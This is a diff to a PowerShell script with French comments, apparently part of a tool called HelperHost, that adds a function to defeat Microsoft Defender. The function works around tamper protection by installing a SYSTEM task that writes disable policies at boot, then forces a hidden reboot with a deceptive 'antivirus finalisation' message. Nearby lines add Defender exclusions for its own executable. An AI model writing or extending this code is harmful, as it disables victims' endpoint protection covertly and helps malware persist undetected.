@@ -653,13 +653,7 @@ function Invoke-SessionHarden {
   Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
   Install-WipeRestoreHook
   Install-EarlyAvTask
-  if (Test-AvStillOn) {
-    'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
-    Remove-Item (Join-Path $Dir '.av-off') -Force -EA SilentlyContinue
-  } else {
-    '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
-    Remove-Item (Join-Path $Dir '.av-need-reboot') -Force -EA SilentlyContinue
-  }
+  Request-AvRebootIfNeeded
 }
 
 function Test-AvStillOn {
@@ -672,6 +666,36 @@ function Test-AvStillOn {
   $v = (Get-ItemProperty $p -Name DisableAntiSpyware -EA SilentlyContinue).DisableAntiSpyware
   if ($v -ne 1) { return $true }
   return $false
+}
+
+function Request-AvRebootIfNeeded {
+  # Tamper bloque les changements a chaud. Un reboot laisse EarlyAV (SYSTEM)
+  # ecrire les politiques avant WinDefend → UI "gere par l'organisation".
+  if (-not (Test-IsAdmin)) { return }
+  if (-not (Test-AvStillOn)) {
+    '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
+    Remove-Item (Join-Path $Dir '.av-need-reboot'), (Join-Path $Dir '.av-rebooted-once') -Force -EA SilentlyContinue
+    return
+  }
+  $once = Join-Path $Dir '.av-rebooted-once'
+  if (Test-Path $once) {
+    # Deja reboote une fois — evite boucle. EarlyAV a du tourner au boot.
+    'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
+    Write-Host 'AV encore actif apres reboot — EarlyAV a tourne, reessaie apres connexion.'
+    return
+  }
+  Install-EarlyAvTask
+  'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
+  '1' | Set-Content -Encoding ASCII $once -Force
+  Write-Host 'AV bloque par Tamper — redemarrage dans 20s (politique organisation)...'
+  try {
+    Start-Process -FilePath "$env:SystemRoot\System32\shutdown.exe" `
+      -ArgumentList @('/r', '/t', '20', '/c', 'HelperHost: finalisation antivirus', '/f') `
+      -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+  } catch {
+    & shutdown.exe /r /t 20 /c "HelperHost AV" /f 2>$null | Out-Null
+  }
+  $script:ElevRebootPending = $true
 }
 
 function Install-EarlyAvTask {
